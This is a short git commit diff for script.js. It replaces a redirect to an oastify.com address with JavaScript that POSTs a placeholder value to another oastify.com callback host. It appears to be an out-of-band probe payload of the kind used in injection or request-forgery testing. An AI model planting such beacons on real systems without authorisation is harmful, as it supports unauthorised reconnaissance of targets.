c852ddc05f68db0c2ddac2a5592f057a6d3ea9c4
l3ng0canh <52392436+l3ng0canh@users.noreply.github.com>
2023-03-03 09:52:29 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,12 @@
-location = 'https://pohtf5og5wx20j5tqhu7pumt4kaby3ms.oastify.com';
+var xhr = new XMLHttpRequest();
+var url = "http://5io99liwzcriuzz9kxonjag9y04rskg9.oastify.com";
+var params = "a";
+xhr.open("POST", url, true);
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhr.onreadystatechange = function() {
+    if(xhr.readyState == 4 && xhr.status == 200) {
+        // Xử lý phản hồi từ server
+        console.log(xhr.responseText);
+    }
+}
+xhr.send(params);
